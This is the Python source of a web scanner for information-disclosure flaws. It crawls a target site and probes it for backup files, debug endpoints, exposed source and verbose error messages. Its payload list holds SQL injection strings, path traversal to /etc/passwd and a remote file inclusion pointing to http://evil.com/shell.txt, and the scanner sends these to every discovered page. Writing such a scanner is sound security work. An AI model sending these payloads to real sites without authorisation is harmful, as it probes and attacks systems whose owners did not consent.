"""
Professional Information Disclosure Scanner
Comprehensive automated scanner for detecting Insecure Destruction / Information Disclosure vulnerabilities

This scanner detects:
- Backup file exposure 
- Debug endpoint disclosure
- Error message information leakage
- Source code exposure
- Configuration file leaks
- Log file exposure
- Directory listing vulnerabilities
- Version control exposure
- Comment-based information disclosure
"""

import logging
import asyncio
import json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Optional, Any, Set
from urllib.parse import urljoin, urlparse
import requests
import re
from collections import deque
import time

# Handle both relative and absolute imports
try:
    from .backup_file_scanner import BackupFileScanner
    from .debug_endpoint_scanner import DebugEndpointScanner 
    from .source_code_scanner import SourceCodeScanner
    from .paramspider_scanner import ParamSpiderScanner
    from .vulnerability_models import (
        InfoDisclosureVulnerability,
        InfoDisclosureSeverity,
        InfoDisclosureType
    )
except ImportError:
    # Fallback for direct execution
    from backup_file_scanner import BackupFileScanner
    from debug_endpoint_scanner import DebugEndpointScanner 
    from source_code_scanner import SourceCodeScanner
    from paramspider_scanner import ParamSpiderScanner
    from vulnerability_models import (
        InfoDisclosureVulnerability,
        InfoDisclosureSeverity,
        InfoDisclosureType
    )

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class InformationDisclosureScanner:
    """
    Professional Information Disclosure Scanner
    
    Comprehensive scanner for detecting all forms of information disclosure vulnerabilities
    including backup files, debug endpoints, source code exposure, and configuration leaks.
    """
    
    def __init__(self, target_url: str, timeout: int = None, max_workers: int = 5, 
                 crawl_depth: int = 3, max_pages: int = 100):
        """
        Initialize Information Disclosure Scanner
        
        Args:
            target_url: Target URL to scan
            timeout: Request timeout in seconds
            max_workers: Maximum concurrent scanning threads
            crawl_depth: Maximum depth to crawl (default: 3)
            max_pages: Maximum number of pages to crawl (default: 100)
        """
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.max_workers = max_workers
        self.crawl_depth = crawl_depth
        self.max_pages = max_pages
        
        # Parse target URL for domain validation
        self.target_domain = urlparse(self.target_url).netloc
        
        # Crawling state
        self.discovered_urls: Set[str] = set()
        self.crawled_urls: Set[str] = set()
        self.crawl_queue: deque = deque()
        self.crawl_statistics = {
            'pages_discovered': 0,
            'pages_crawled': 0,
            'external_links_found': 0,
            'crawl_errors': 0
        }
        
        # Initialize sub-scanners (will be updated per URL during crawling)
        # Each scanner gets fresh target URL to ensure real data discovery
        self.backup_scanner = BackupFileScanner(self.target_url, timeout)
        self.debug_scanner = DebugEndpointScanner(self.target_url, timeout)
        self.source_scanner = SourceCodeScanner(self.target_url, timeout)
        self.paramspider_scanner = ParamSpiderScanner(self.target_url, timeout)
        
        # Add scan metadata for fresh data tracking
        self.scan_metadata = {
            'scan_timestamp': datetime.now().isoformat(),
            'target_domain': self.target_domain,
            'fresh_data_enabled': True,
            'cache_busting': True
        }
        
        # Results storage
        self.vulnerabilities: List[InfoDisclosureVulnerability] = []
        self.discovered_parameters: Set[str] = set()  # Store discovered parameters
        self.scan_statistics = {
            'start_time': None,
            'fresh_data_scan': True,  # Flag to indicate this is a fresh data scan
            'end_time': None,
            'duration': 0,
            'total_vulnerabilities': 0,
            'vulnerabilities_by_type': {},
            'vulnerabilities_by_severity': {},
            'scanner_coverage': {},
            'crawl_stats': self.crawl_statistics,
            'parameters_discovered': 0
        }
        
        # Additional error-based scanning patterns
        self.error_test_payloads = [
            # SQL injection for error disclosure
            "' OR '1'='1",
            "1' OR '1'='1' --",
            "admin'--",
            "' UNION SELECT NULL--",
            
            # Path traversal for error disclosure
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            
            # Invalid parameters for debug info
            "debug=1&trace=1",
            "test=1&dev=1", 
            "error=1&verbose=1",
            
            # File inclusion attempts
            "?file=../../../../etc/passwd",
            "?page=../../../windows/system32/drivers/etc/hosts",
            "?include=http://evil.com/shell.txt"
        ]
    
    async def _discover_parameters(self) -> None:
        """Discover parameters using ParamSpider for more targeted testing"""
        logger.info("🔍 Discovering parameters with ParamSpider...")
        
        try:
            # Run ParamSpider scan
            paramspider_results = await self.paramspider_scanner.scan()
            
            # Extract discovered parameters
            if paramspider_results.get('findings'):
                for finding in paramspider_results['findings']:
                    param = finding.get('parameter')
                    if param:
                        self.discovered_parameters.add(param)
            
            self.scan_statistics['parameters_discovered'] = len(self.discovered_parameters)
            logger.info(f"✅ ParamSpider discovered {len(self.discovered_parameters)} parameters")
            
            # Add ParamSpider findings to vulnerabilities if they're dangerous
            for finding in paramspider_results.get('findings', []):
                if finding.get('severity') == 'MEDIUM':  # Dangerous parameters
                    # Convert to InfoDisclosureVulnerability
                    vuln = InfoDisclosureVulnerability(
                        id=f"PARAM-{hash(finding.get('parameter', '')) % 10000}",
                        type=InfoDisclosureType.DEBUG_ENDPOINT,  # Using closest type
                        severity=InfoDisclosureSeverity.LOW,
                        url=self.target_url,
                        evidence=f"Parameter discovered: {finding.get('parameter')}",
                        sensitive_data=finding.get('parameter', ''),
                        exposure_method="Parameter discovery via ParamSpider",
                        risk_description=finding.get('description', 'Parameter should be tested for injection'),
                        business_impact="Discovered parameters may be vulnerable to injection attacks",
                        remediation="Test discovered parameters for injection vulnerabilities and implement proper input validation",
                        cwe_id="CWE-200",
                        owasp_category="A03:2021 – Injection",
                        confidence="MEDIUM",
                        cve_references=[],
                        cvss_score=3.0,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
                        exploit_complexity="LOW",
                        attack_vector="NETWORK",
                        privileges_required="NONE",
                        user_interaction="NONE",
                        timestamp=datetime.now().isoformat()
                    )
                    self.vulnerabilities.append(vuln)
            
        except Exception as e:
            logger.warning(f"ParamSpider scan failed: {e}")
    
    async def scan(self) -> Dict[str, Any]:
        """
        Perform comprehensive information disclosure scan
        
        Returns:
            Dictionary containing scan results and statistics
        """
        logger.info(f"🎯 Starting Information Disclosure Scanner on {self.target_url}")
        logger.info("=" * 70)
        
        self.scan_statistics['start_time'] = datetime.now()
        
        try:
            # Step 1: Discover parameters using ParamSpider
            await self._discover_parameters()
            
            # Step 2: Crawl website to discover all pages
            self._crawl_website()
            
            # Step 3: Perform sequential scanning on all discovered URLs
            self._perform_comprehensive_scan()
            
            # Step 4: Additional error-based testing (now with discovered parameters)
            self._scan_error_disclosure()
            
            # Step 5: Generate final statistics
            self._generate_statistics()
            
            # Step 6: Log results summary
            self._log_scan_summary()
            
            return self._format_results()
            
        except Exception as e:
            logger.error(f"❌ Scan failed: {e}")
            raise
        
        finally:
            self.scan_statistics['end_time'] = datetime.now()
            if self.scan_statistics['start_time']:
                duration = self.scan_statistics['end_time'] - self.scan_statistics['start_time']
                self.scan_statistics['duration'] = duration.total_seconds()
    
    def _crawl_website(self) -> None:
        """Crawl website to discover all accessible pages"""
        logger.info("🕷️ Starting website crawling to discover all pages...")
        
        # Initialize crawl queue with target URL
        self.crawl_queue.append((self.target_url, 0))  # (url, depth)
        self.discovered_urls.add(self.target_url)
        
        session = requests.Session()
        # Ensure fresh data by disabling caching and using current timestamp
        current_timestamp = int(datetime.now().timestamp())
        session.headers.update({
            'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0',
            'X-Requested-With': f'Scanner-{current_timestamp}'  # Unique identifier for each scan
        })
        
        while self.crawl_queue and len(self.crawled_urls) < self.max_pages:
            current_url, depth = self.crawl_queue.popleft()
            
            if current_url in self.crawled_urls or depth > self.crawl_depth:
                continue
            
            try:
                self._crawl_single_page(current_url, depth, session)
                self.crawled_urls.add(current_url)
                self.crawl_statistics['pages_crawled'] += 1
                
                # Small delay to be respectful
                time.sleep(0.5)
                
            except Exception as e:
                logger.debug(f"Failed to crawl {current_url}: {e}")
                self.crawl_statistics['crawl_errors'] += 1
        
        logger.info(f"🕷️ Crawling completed: {len(self.discovered_urls)} pages discovered, {len(self.crawled_urls)} pages crawled")
    
    def _crawl_single_page(self, url: str, depth: int, session: requests.Session) -> None:
        """Crawl a single page to extract links - ensures fresh data from live website"""
        try:
            # Add timestamp parameter to ensure fresh data
            current_timestamp = int(datetime.now().timestamp())
            if '?' in url:
                fresh_url = f"{url}&_t={current_timestamp}"
            else:
                fresh_url = f"{url}?_t={current_timestamp}"
            
            # No timeout - allow complete page crawling
            response = session.get(fresh_url, timeout=None)
            
            if response.status_code != 200:
                return
            
            content_type = response.headers.get('content-type', '').lower()
            if 'html' not in content_type:
                return
            
            # Extract links from HTML
            links = self._extract_links(response.text, url)
            
            # Filter and add valid links to queue
            for link in links:
                if self._is_valid_internal_link(link) and link not in self.discovered_urls:
                    if len(self.discovered_urls) < self.max_pages:
                        self.discovered_urls.add(link)
                        self.crawl_queue.append((link, depth + 1))
                        self.crawl_statistics['pages_discovered'] += 1
                        logger.debug(f"🔗 Discovered: {link}")
                    
        except requests.RequestException as e:
            logger.debug(f"Request failed for {url}: {e}")
            raise
    
    def _extract_links(self, html_content: str, base_url: str) -> Set[str]:
        """Extract all links from HTML content"""
        links = set()
        
        # Find all href attributes
        href_pattern = r'href\s*=\s*["\']([^"\']+)["\']'
        href_matches = re.findall(href_pattern, html_content, re.IGNORECASE)
        
        # Find all src attributes (for completeness)
        src_pattern = r'src\s*=\s*["\']([^"\']+)["\']'
        src_matches = re.findall(src_pattern, html_content, re.IGNORECASE)
        
        # Process all found URLs
        for match in href_matches + src_matches:
            try:
                # Convert relative URLs to absolute
                full_url = urljoin(base_url, match.strip())
                
                # Clean up URL (remove fragments)
                if '#' in full_url:
                    full_url = full_url.split('#')[0]
                
                # Remove common parameters that don't affect content
                if '?' in full_url:
                    url_base = full_url.split('?')[0]
                    # Keep URLs with parameters as they might reveal different content
                    links.add(full_url)
                    links.add(url_base)  # Also add base URL
                else:
                    links.add(full_url)
                    
            except Exception as e:
                logger.debug(f"Failed to process URL {match}: {e}")
                continue
        
        return links
    
    def _is_valid_internal_link(self, url: str) -> bool:
        """Check if URL is a valid internal link to crawl"""
        try:
            parsed = urlparse(url)
            
            # Must be same domain
            if parsed.netloc and parsed.netloc != self.target_domain:
                self.crawl_statistics['external_links_found'] += 1
                return False
            
            # Skip common file extensions that won't have links
            skip_extensions = {
                '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
                '.zip', '.rar', '.7z', '.tar', '.gz',
                '.jpg', '.jpeg', '.png', '.gif', '.svg', '.webp',
                '.mp4', '.avi', '.mov', '.wmv',
                '.mp3', '.wav', '.ogg',
                '.css', '.js', '.json', '.xml', '.txt',
                '.exe', '.msi', '.deb', '.rpm'
            }
            
            path_lower = parsed.path.lower()
            for ext in skip_extensions:
                if path_lower.endswith(ext):
                    return False
            
            # Skip common non-content paths
            skip_patterns = [
                '/logout', '/signout', '/exit',
                '/delete', '/remove',
                '/ajax/', '/api/',
                'javascript:', 'mailto:', 'tel:', 'ftp:'
            ]
            
            url_lower = url.lower()
            for pattern in skip_patterns:
                if pattern in url_lower:
                    return False
            
            # Must be HTTP/HTTPS
            if parsed.scheme and parsed.scheme not in ['http', 'https']:
                return False
            
            return True
            
        except Exception:
            return False
    
    def _perform_comprehensive_scan(self) -> None:
        """Perform comprehensive scanning on all discovered URLs sequentially"""
        logger.info(f"🚀 Starting comprehensive scan on {len(self.discovered_urls)} discovered pages...")
        
        # Scan URLs in parallel
        url_list = list(self.discovered_urls)
        
        # De-duplicate URLs by directory structure to avoid redundant heavy scans
        # We still scan all URLs for lightweight checks if needed, but for file brute-forcing
        # we can group by directory.
        # However, to ensure 100% coverage as requested, we will scan ALL URLs but rely
        # on the internal efficiency of the scanners. 
        # For now, we just parallelize the exact list we had.
        
        max_workers = 5 # Default to 5 to be safe with RAM/Network, configurable if needed
        if hasattr(self, 'max_workers') and self.max_workers:
             max_workers = self.max_workers

        logger.info(f"🔄 Scanning {len(url_list)} URLs with {max_workers} threads...")

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            # Submit all URL scan tasks
            future_to_url = {
                executor.submit(self._scan_url_batch, [url]): url 
                for url in url_list
            }
            
            completed_count = 0
            for future in as_completed(future_to_url):
                url = future_to_url[future]
                completed_count += 1
                try:
                    batch_vulnerabilities = future.result()
                    self.vulnerabilities.extend(batch_vulnerabilities)
                    if batch_vulnerabilities:
                         logger.info(f"URL {completed_count}/{len(url_list)} ({url}): Found {len(batch_vulnerabilities)} vulns")
                    else:
                         logger.debug(f"URL {completed_count}/{len(url_list)} ({url}): Clean")
                         
                except Exception as e:
                    logger.error(f"URL scan failed for {url}: {e}")
    
    def _scan_url_batch(self, urls: List[str]) -> List[InfoDisclosureVulnerability]:
        """Scan a batch of URLs for vulnerabilities"""
        batch_vulnerabilities = []
        
        for url in urls:
            try:
                # Update scanners for current URL
                backup_scanner = BackupFileScanner(url, self.timeout)
                debug_scanner = DebugEndpointScanner(url, self.timeout)
                source_scanner = SourceCodeScanner(url, self.timeout)
                # Note: ParamSpider runs once at the beginning, not per URL
                
                # Scan with each scanner
                batch_vulnerabilities.extend(backup_scanner.scan_backup_files())
                batch_vulnerabilities.extend(debug_scanner.scan_debug_endpoints())
                batch_vulnerabilities.extend(source_scanner.scan_source_code())
                
                logger.debug(f"🔍 Scanned {url}: {len(batch_vulnerabilities)} vulnerabilities so far")
                
            except Exception as e:
                logger.debug(f"Failed to scan {url}: {e}")
                continue
        
        return batch_vulnerabilities
    
    def _perform_sequential_scan(self) -> None:
        """Perform sequential scanning using sub-scanners (one by one)"""
        logger.info("🚀 Executing sequential vulnerability scans...")
        
        # Define scanning tasks
        scan_tasks = [
            ('backup_files', self.backup_scanner.scan_backup_files),
            ('debug_endpoints', self.debug_scanner.scan_debug_endpoints),
            ('source_code', self.source_scanner.scan_source_code),
            # ParamSpider runs separately in _discover_parameters()
        ]
        
        # Execute scans sequentially (one by one)
        for task_name, task_func in scan_tasks:
            try:
                logger.info(f"🔄 Starting {task_name.replace('_', ' ').title()} scan...")
                vulnerabilities = task_func()
                self.vulnerabilities.extend(vulnerabilities)
                
                # Track scanner coverage
                self.scan_statistics['scanner_coverage'][task_name] = len(vulnerabilities)
                
                logger.info(f"✅ {task_name.replace('_', ' ').title()} scan completed: {len(vulnerabilities)} vulnerabilities")
                
            except Exception as e:
                logger.error(f"❌ {task_name} scan failed: {e}")
    
    def _scan_error_disclosure(self) -> None:
        """Scan for error message information disclosure on all discovered URLs"""
        logger.info("🔍 Testing error message disclosure on all discovered pages...")
        
        # Use discovered parameters from ParamSpider + common parameters
        common_params = ['id', 'page', 'file', 'user', 'admin', 'test', 'debug']
        all_params = list(self.discovered_parameters) + common_params
        
        # Remove duplicates while preserving order
        seen = set()
        test_params = []
        for param in all_params:
            if param not in seen:
                seen.add(param)
                test_params.append(param)
        
        logger.info(f"📝 Testing with {len(test_params)} parameters (including {len(self.discovered_parameters)} from ParamSpider)")
        
        # Test on a sample of discovered URLs (limit to avoid too many requests)
        sample_urls = list(self.discovered_urls)[:20]  # Test on first 20 URLs
        
        for base_url in sample_urls:
            for param in test_params[:5]:  # Test up to 5 parameters per URL (prioritizing discovered ones)
                for payload in self.error_test_payloads[:3]:  # Limit payloads to avoid noise
                    try:
                        # Test GET parameter
                        test_url = f"{base_url}?{param}={payload}"
                        self._test_error_response(test_url, f"GET parameter: {param}")
                        
                        # Test POST parameter on this URL
                        self._test_post_error_on_url(base_url, param, payload)
                        
                    except Exception as e:
                        logger.debug(f"Error testing payload {payload} on {base_url}: {e}")
                        continue
    
    def _test_error_response(self, test_url: str, context: str) -> None:
        """Test URL for error message disclosure"""
        
        try:
            response = requests.get(test_url, timeout=self.timeout)
            
            if self._contains_error_disclosure(response):
                vulnerability = self._create_error_vulnerability(test_url, response, context)
                if vulnerability:
                    self.vulnerabilities.append(vulnerability)
                    logger.warning(f"🚨 Error disclosure found: {test_url}")
                    
        except requests.RequestException:
            pass
    
    def _test_post_error_on_url(self, url: str, param: str, payload: str) -> None:
        """Test POST parameter for error disclosure on specific URL"""
        
        try:
            data = {param: payload}
            response = requests.post(url, data=data, timeout=self.timeout)
            
            if self._contains_error_disclosure(response):
                vulnerability = self._create_error_vulnerability(
                    url, response, f"POST parameter: {param}"
                )
                if vulnerability:
                    self.vulnerabilities.append(vulnerability)
                    logger.warning(f"🚨 POST error disclosure found: {param}={payload} on {url}")
                    
        except requests.RequestException:
            pass
    
    def _test_post_error(self, param: str, payload: str) -> None:
        """Test POST parameter for error disclosure (legacy method for compatibility)"""
        self._test_post_error_on_url(self.target_url, param, payload)
    
    def _contains_error_disclosure(self, response: requests.Response) -> bool:
        """Check if response contains error message disclosure"""
        
        if response.status_code not in [200, 400, 500]:
            return False
        
        content = response.text.lower()
        
        # Error disclosure patterns
        error_patterns = [
            r'mysql.*error',
            r'postgresql.*error', 
            r'oracle.*error',
            r'microsoft.*odbc',
            r'warning:.*mysql',
            r'fatal error:',
            r'notice:.*undefined',
            r'traceback.*most recent call',
            r'exception.*at line',
            r'sql.*syntax.*error',
            r'database.*connection.*failed',
            r'file_get_contents.*failed',
            r'include.*failed.*opening',
            r'permission denied.*in',
            r'no such file.*directory'
        ]
        
        import re
        for pattern in error_patterns:
            if re.search(pattern, content):
                return True
        
        return False
    
    def _create_error_vulnerability(
        self, 
        url: str, 
        response: requests.Response, 
        context: str
    ) -> Optional[InfoDisclosureVulnerability]:
        """Create error message vulnerability"""
        
        # Extract error details
        error_content = response.text[:1000]  # First 1KB
        
        # Assess severity
        severity = InfoDisclosureSeverity.MEDIUM
        if any(keyword in error_content.lower() for keyword in ['password', 'secret', 'key']):
            severity = InfoDisclosureSeverity.HIGH
        elif any(keyword in error_content.lower() for keyword in ['mysql', 'database', 'sql']):
            severity = InfoDisclosureSeverity.MEDIUM
        else:
            severity = InfoDisclosureSeverity.LOW
        
        # Get CVE info (using debug endpoint CVEs for error messages)
        try:
            from .vulnerability_models import CVE_DATABASE
        except ImportError:
            from vulnerability_models import CVE_DATABASE
        cve_info = CVE_DATABASE.get("ERROR_MESSAGE", {}).get(severity.value, {
            "cve_references": [],
            "cvss_score": 5.0,
            "attack_vector": "NETWORK",
            "exploit_complexity": "MEDIUM"
        })
        
        vulnerability = InfoDisclosureVulnerability(
            id=f"ERROR-MSG-{hash(url + context) % 10000}",
            type=InfoDisclosureType.ERROR_MESSAGE,
            severity=severity,
            url=url,
            evidence=f"Error message disclosure via {context}",
            sensitive_data=error_content[:200],  # First 200 chars
            exposure_method=f"Error triggered through {context}",
            risk_description="Error messages reveal internal application details and system information",
            business_impact="Information disclosure aids reconnaissance and vulnerability discovery",
            remediation="Implement custom error pages and disable detailed error messages in production",
            cwe_id="CWE-209",
            owasp_category="A05:2021 – Security Misconfiguration",
            confidence="MEDIUM",
            cve_references=cve_info['cve_references'],
            cvss_score=cve_info['cvss_score'],
            cvss_vector=f"CVSS:3.1/AV:{cve_info['attack_vector'][0]}/AC:{cve_info['exploit_complexity'][0]}/PR:N/UI:N/S:U/C:L/I:N/A:N",
            exploit_complexity=cve_info['exploit_complexity'],
            attack_vector=cve_info['attack_vector'],
            privileges_required="NONE",
            user_interaction="NONE",
            timestamp=datetime.now().isoformat()
        )
        
        return vulnerability
    
    def _generate_statistics(self) -> None:
        """Generate comprehensive scan statistics"""
        
        self.scan_statistics['total_vulnerabilities'] = len(self.vulnerabilities)
        
        # Count by type
        type_counts = {}
        for vuln in self.vulnerabilities:
            vuln_type = vuln.type.value
            type_counts[vuln_type] = type_counts.get(vuln_type, 0) + 1
        self.scan_statistics['vulnerabilities_by_type'] = type_counts
        
        # Count by severity
        severity_counts = {}
        for vuln in self.vulnerabilities:
            severity = vuln.severity.value
            severity_counts[severity] = severity_counts.get(severity, 0) + 1
        self.scan_statistics['vulnerabilities_by_severity'] = severity_counts
    
    def _log_scan_summary(self) -> None:
        """Log comprehensive scan summary"""
        
        logger.info("\n" + "=" * 70)
        logger.info("📊 INFORMATION DISCLOSURE SCAN RESULTS")
        logger.info("=" * 70)
        
        # Overall statistics
        logger.info(f"🎯 Target: {self.target_url}")
        logger.info(f"⏱️ Duration: {self.scan_statistics['duration']:.2f} seconds")
        logger.info(f"�️ Pages Discovered: {self.crawl_statistics['pages_discovered']}")
        logger.info(f"🔍 Pages Scanned: {self.crawl_statistics['pages_crawled']}")
        logger.info(f"�🚨 Total Vulnerabilities: {self.scan_statistics['total_vulnerabilities']}")
        
        # Vulnerability by severity
        logger.info("\n📈 VULNERABILITIES BY SEVERITY:")
        for severity, count in self.scan_statistics['vulnerabilities_by_severity'].items():
            logger.info(f"  {severity}: {count}")
        
        # Vulnerability by type
        logger.info("\n📋 VULNERABILITIES BY TYPE:")
        for vuln_type, count in self.scan_statistics['vulnerabilities_by_type'].items():
            logger.info(f"  {vuln_type.replace('_', ' ').title()}: {count}")
        
        # Scanner coverage
        logger.info("\n🔍 SCANNER COVERAGE:")
        for scanner, count in self.scan_statistics['scanner_coverage'].items():
            logger.info(f"  {scanner.replace('_', ' ').title()}: {count} vulnerabilities")
        
        # Top vulnerabilities
        if self.vulnerabilities:
            logger.info("\n🏆 TOP VULNERABILITIES:")
            critical_high = [v for v in self.vulnerabilities 
                           if v.severity in [InfoDisclosureSeverity.CRITICAL, InfoDisclosureSeverity.HIGH]]
            
            for i, vuln in enumerate(critical_high[:5], 1):
                logger.info(f"  {i}. {vuln.type.value} - {vuln.severity.value}")
                logger.info(f"     URL: {vuln.url}")
                logger.info(f"     CVEs: {len(vuln.cve_references)} references")
        
        logger.info("=" * 70)
    
    def _format_results(self) -> Dict[str, Any]:
        """Format scan results for output"""
        
        return {
            'scan_info': {
                'target_url': self.target_url,
                'timestamp': datetime.now().isoformat(),
                'scanner_version': '1.0.0',
                'scan_type': 'Information Disclosure',
                'duration_seconds': self.scan_statistics['duration']
            },
            'statistics': self.scan_statistics,
            'vulnerabilities': [vuln.to_dict() for vuln in self.vulnerabilities],
            'summary': {
                'total_vulnerabilities': len(self.vulnerabilities),
                'critical': len([v for v in self.vulnerabilities if v.severity == InfoDisclosureSeverity.CRITICAL]),
                'high': len([v for v in self.vulnerabilities if v.severity == InfoDisclosureSeverity.HIGH]),
                'medium': len([v for v in self.vulnerabilities if v.severity == InfoDisclosureSeverity.MEDIUM]),
                'low': len([v for v in self.vulnerabilities if v.severity == InfoDisclosureSeverity.LOW]),
                'cve_references_total': sum(len(v.cve_references) for v in self.vulnerabilities)
            },
            'recommendations': self._generate_recommendations()
        }
    
    def _generate_recommendations(self) -> List[str]:
        """Generate security recommendations based on findings"""
        
        recommendations = []
        
        # Check vulnerability types for specific recommendations
        vuln_types = {vuln.type for vuln in self.vulnerabilities}
        
        if InfoDisclosureType.BACKUP_FILE in vuln_types:
            recommendations.append("Remove all backup files from web-accessible directories")
            recommendations.append("Implement secure backup storage with proper access controls")
        
        if InfoDisclosureType.DEBUG_ENDPOINT in vuln_types:
            recommendations.append("Disable debug endpoints and development interfaces in production")
            recommendations.append("Implement proper environment separation")
        
        if InfoDisclosureType.SOURCE_CODE in vuln_types:
            recommendations.append("Remove source code files and version control directories from web root")
            recommendations.append("Implement secure deployment processes")
        
        if InfoDisclosureType.ERROR_MESSAGE in vuln_types:
            recommendations.append("Implement custom error pages to prevent information disclosure")
            recommendations.append("Configure proper error logging without exposing details to users")
        
        if InfoDisclosureType.CONFIG_FILE in vuln_types:
            recommendations.append("Move configuration files outside web-accessible directories")
            recommendations.append("Implement proper configuration management")
        
        # General recommendations
        recommendations.extend([
            "Regularly audit web-accessible directories for sensitive files",
            "Implement proper web server configuration to prevent directory listing",
            "Use security scanning tools in development and deployment pipelines",
            "Train development teams on secure coding practices"
        ])
        
        return recommendations
    
    def export_results(self, output_file: str, format_type: str = 'json') -> None:
        """
        Export scan results to file
        
        Args:
            output_file: Output file path
            format_type: Export format ('json', 'html', 'csv')
        """
        
        results = self._format_results()
        
        if format_type.lower() == 'json':
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(results, f, indent=2, ensure_ascii=False)
        
        elif format_type.lower() == 'html':
            self._export_html_report(results, output_file)
        
        elif format_type.lower() == 'csv':
            self._export_csv_report(results, output_file)
        
        else:
            raise ValueError(f"Unsupported export format: {format_type}")
        
        logger.info(f"📄 Results exported to: {output_file}")
    
    def _export_html_report(self, results: Dict[str, Any], output_file: str) -> None:
        """Export HTML report"""
        
        html_template = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Information Disclosure Scanner Report</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                .header {{ background: #f4f4f4; padding: 20px; border-radius: 5px; }}
                .vulnerability {{ margin: 10px 0; padding: 15px; border-left: 4px solid #ccc; }}
                .critical {{ border-left-color: #d32f2f; background: #ffebee; }}
                .high {{ border-left-color: #f57c00; background: #fff3e0; }}
                .medium {{ border-left-color: #fbc02d; background: #fffde7; }}
                .low {{ border-left-color: #388e3c; background: #e8f5e8; }}
                .stats {{ display: flex; gap: 20px; margin: 20px 0; }}
                .stat-box {{ padding: 15px; background: #f5f5f5; border-radius: 5px; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>🔍 Information Disclosure Scanner Report</h1>
                <p><strong>Target:</strong> {results['scan_info']['target_url']}</p>
                <p><strong>Scan Date:</strong> {results['scan_info']['timestamp']}</p>
                <p><strong>Duration:</strong> {results['scan_info']['duration_seconds']:.2f} seconds</p>
                <p><strong>Pages Discovered:</strong> {results['statistics']['crawl_stats']['pages_discovered']}</p>
                <p><strong>Pages Scanned:</strong> {results['statistics']['crawl_stats']['pages_crawled']}</p>
            </div>
            
            <div class="stats">
                <div class="stat-box">
                    <h3>📊 Summary</h3>
                    <p>Total Vulnerabilities: {results['summary']['total_vulnerabilities']}</p>
                    <p>CVE References: {results['summary']['cve_references_total']}</p>
                </div>
                <div class="stat-box">
                    <h3>🚨 By Severity</h3>
                    <p>Critical: {results['summary']['critical']}</p>
                    <p>High: {results['summary']['high']}</p>
                    <p>Medium: {results['summary']['medium']}</p>
                    <p>Low: {results['summary']['low']}</p>
                </div>
            </div>
            
            <h2>🚨 Vulnerabilities</h2>
        """
        
        for vuln in results['vulnerabilities']:
            severity_class = vuln['severity'].lower()
            html_template += f"""
            <div class="vulnerability {severity_class}">
                <h3>{vuln['type']} - {vuln['severity']}</h3>
                <p><strong>URL:</strong> {vuln['url']}</p>
                <p><strong>Evidence:</strong> {vuln['evidence']}</p>
                <p><strong>Risk:</strong> {vuln['risk_description']}</p>
                <p><strong>Remediation:</strong> {vuln['remediation']}</p>
                <p><strong>CVE References:</strong> {len(vuln['cve_references'])}</p>
                <p><strong>CVSS Score:</strong> {vuln['cvss_score']}</p>
            </div>
            """
        
        html_template += """
            </body>
            </html>
        """
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(html_template)
    
    def _export_csv_report(self, results: Dict[str, Any], output_file: str) -> None:
        """Export CSV report"""
        
        import csv
        
        with open(output_file, 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            
            # Write header
            writer.writerow([
                'Type', 'Severity', 'URL', 'Evidence', 'Risk Description',
                'Remediation', 'CWE ID', 'OWASP Category', 'CVSS Score',
                'CVE Count', 'Timestamp'
            ])
            
            # Write vulnerabilities
            for vuln in results['vulnerabilities']:
                writer.writerow([
                    vuln['type'],
                    vuln['severity'], 
                    vuln['url'],
                    vuln['evidence'],
                    vuln['risk_description'],
                    vuln['remediation'],
                    vuln['cwe_id'],
                    vuln['owasp_category'],
                    vuln['cvss_score'],
                    len(vuln['cve_references']),
                    vuln['timestamp']
                ])


# CLI Interface for standalone execution
async def async_main():
    """Async main function for scanner"""
    import argparse
    
    parser = argparse.ArgumentParser(
        description='Professional Information Disclosure Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python information_disclosure_scanner.py https://example.com
  python information_disclosure_scanner.py https://example.com --output report.json
  python information_disclosure_scanner.py https://example.com --format html --output report.html
        """
    )
    
    parser.add_argument('url', help='Target URL to scan')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout (default: 10)')
    parser.add_argument('--workers', type=int, default=5, help='Max concurrent threads (default: 5)')
    parser.add_argument('--crawl-depth', type=int, default=3, help='Maximum crawl depth (default: 3)')
    parser.add_argument('--max-pages', type=int, default=100, help='Maximum pages to crawl (default: 100)')
    parser.add_argument('--output', '-o', default='info_disclosure_scan.json', 
                       help='Output file (default: info_disclosure_scan.json)')
    parser.add_argument('--format', choices=['json', 'html', 'csv'], default='json',
                       help='Output format (default: json)')
    parser.add_argument('--verbose', '-v', action='store_true', help='Verbose logging')
    
    args = parser.parse_args()
    
    # Configure logging
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    try:
        # Initialize and run scanner
        scanner = InformationDisclosureScanner(
            target_url=args.url,
            timeout=args.timeout,
            max_workers=args.workers,
            crawl_depth=args.crawl_depth,
            max_pages=args.max_pages
        )
        
        # Perform scan
        results = scanner.scan()
        
        # Export results
        scanner.export_results(args.output, args.format)
        
        print(f"\n✅ Scan completed successfully!")
        print(f"📊 Found {results['summary']['total_vulnerabilities']} vulnerabilities")
        print(f"📄 Results saved to: {args.output}")
        
    except KeyboardInterrupt:
        print("\n❌ Scan interrupted by user")
    except Exception as e:
        print(f"❌ Scan failed: {e}")
        return 1
    
    return 0

def main():
